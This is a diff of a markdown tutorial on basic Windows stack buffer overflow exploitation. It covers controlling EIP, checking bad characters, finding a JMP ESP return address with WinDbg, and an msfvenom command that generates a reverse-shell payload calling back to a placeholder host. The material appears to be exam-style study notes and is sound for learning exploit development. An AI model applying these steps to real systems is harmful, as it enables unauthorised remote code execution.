@@ -1,6 +1,21 @@
-# Stack Overflow - Basic
+## Stack Overflow - Basic
 
-#### Crash the application. ("A" buffer.)
+### Table of Contents
+
+* 1. [Crash the application.](#Crash)
+* 2. [Control the EIP.](#EIP)
+* 3. [Locate Space for our shellcode.](#LocateShellcode)
+* 4. [Calculate Space for our shellcode.](#SpaceShellcode)
+* 5. [Checking for bad characters.](#BadChars)
+* 6. [Finding Returning address.](#JMP)
+* 7. [Controling the Execution Flow.](#ControlExecutionFlow)
+* 8. [Get a Shell!](#Shell)
+* 9. [No Shell?](#NoShell)
+* 10. [Sometimes...](#Sometimes)
+  * 10.1 [Not enough space to test bad characters.](#NotEnoughSpace-BadChars) 
+  * 10.2 [Not enough space for the shellcode.](#NotEnoughSpace-Shellcode)
+
+#### 1. Crash the application. ("A" buffer.)<a name="Crash"></a>
 
 ```python
 ...
@@ -10,7 +25,9 @@ buffer = "A" * size
 ...
 ```
 
-#### Control the EIP.
+#### 2. Control the EIP.<a name="EIP"></a>
+
+First, generate the unique string, locate the EIP value, and locate it's exact offset.
 
 ```bash
 ┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
@@ -26,7 +43,7 @@ buffer = "A" * size
 #Let's say EIP offset = 2600
 ```
 
-#### Verify that you control EIP. ("A" + "B" + "C" buffer.)
+Now Verify that you control EIP. ("A" + "B" + "C" buffer.)
 
 ```python
 ...
@@ -38,7 +55,7 @@ shellcode = "C" * (size - len(buffer) - len(eip))
 ...
 ````
 
-#### Locate Space for our shellcode. ("A" + "B" + "C" buffer.) 
+#### 3. Locate Space for our shellcode. ("A" + "B" + "C" buffer.)<a name="LocateShellcode"></a>
 
 ```python
 size = 3000
@@ -72,7 +89,7 @@ shellcode = "D" * 692
 ...
 ```
 
-#### Calculate Space for our shellcode.  ("A" + "B" + "C" + "D" buffer, where "C" is our 8 offset, and "D" is our shellcode place.) 
+#### 4. Calculate Space for our shellcode.  ("A" + "B" + "C" + "D" buffer, where "C" is our 8 offset, and "D" is our shellcode place.)<a name="SpaceShellcode"></a> 
 
 Check the Beginning of the "D" buffer.
 
@@ -92,7 +109,7 @@ Calcule the place for our shellcode.
 0:005> ? <End of the buffer> - <Beginning of the buffer>
 ```
 
-#### Checking for bad characters. (0x00 is not in the list and is considered as bad char)
+#### 5. Checking for bad characters. (0x00 is not in the list and is considered as bad char)<a name="BadChars"></a>
 
 ```python
  ...
@@ -128,7 +145,7 @@ Calcule the place for our shellcode.
 0:005> db esp - 10 L110
 ```
 
-#### Finding a JMP ESP instruction.
+#### 6. Finding Returning address.<a name="JMP"></a>
 
 Locate a dll without protection (SEH OFF) using the WinDbg extension <a href="https://code.google.com/archive/p/narly/">"Narly"</a>
 
@@ -162,7 +179,9 @@ start    end        module name
 ...
 ```
 
-#### Replace the B buffer with JMP ESP instruction (EIP).
+#### 7. Controling the Execution Flow.<a name="ControlExecutionFlow"></a>
+
+Replace the B buffer with JMP ESP instruction (EIP).
 
 ```python
 ...
@@ -175,14 +194,14 @@ shellcode = b"D" * 692
 ...
 ```
 
-#### Set a breakpoint to JMP ESP, continue the execution flow, and run the PoC.
+Set a breakpoint to JMP ESP, continue the execution flow, and run the PoC.
 
 ```bash
 0:005> bp 124060cf
 0:005> g
 ```
 
-#### Walking throught the code with "t" command, once we reach the next instruction of "JMP ESP", read the value of esp register to confirm it contain our bunch of "D".
+Walking throught the code with "t" command, once we reach the next instruction of "JMP ESP", read the value of esp register to confirm it contain our bunch of "D".
 
 ```bash
 ...
@@ -191,7 +210,9 @@ shellcode = b"D" * 692
 0:005> dc esp L4
 ```
 
-#### Replace our bunch of D with our shellcode excluding the found badchars (only 0x00 in our case).
+#### 8. Get a Shell!<a name="Shell"></a>
+
+Replace our bunch of D with our shellcode excluding the found badchars (only 0x00 in our case).
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -b "\x00" -f python -v shellcode
@@ -199,7 +220,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port
 
 Execute our exploit and get a shell.
 
-#### If after executing the PoC you didn't get a shell, analyse the crash.
+#### 9. No Shell?<a name="NoShell"></a>
+
+If after executing the PoC you didn't get a shell, analyse the crash.
 
 If you see that you'r shellcode is mangled, you can use NOPs instruction before the shellcode, those instruction will be executed since it reach the shellcode to execute it.
 
@@ -215,15 +238,15 @@ shellcode = <Shellcode Here>
 ...
 ```
  
- ## Sometimes ...
+### 10. Sometimes ...<a name="Sometimes"></a>
  
-#### Not enough space to test bad characters.
+#### 10.1 Not enough space to test bad characters.<a name="NotEnoughSpace-BadChars"></a>
 
 Sometime, if you didn't have enough size to test all the bad characters in one shot.
  
 To overcome this, you can comment all the badchars line, and send the maximum badchars size possible at a time.
 
-#### Not enough space for the shellcode.
+#### 10.2 Not enough space for the shellcode.<a name="NotEnoughSpace-Shellcode"></a>
 
 If you cant find enought space for the shellcode, once you get the JMP ESP instruction, check if any others registers redirect to our buffer (it can be the "A" buffer too).
  
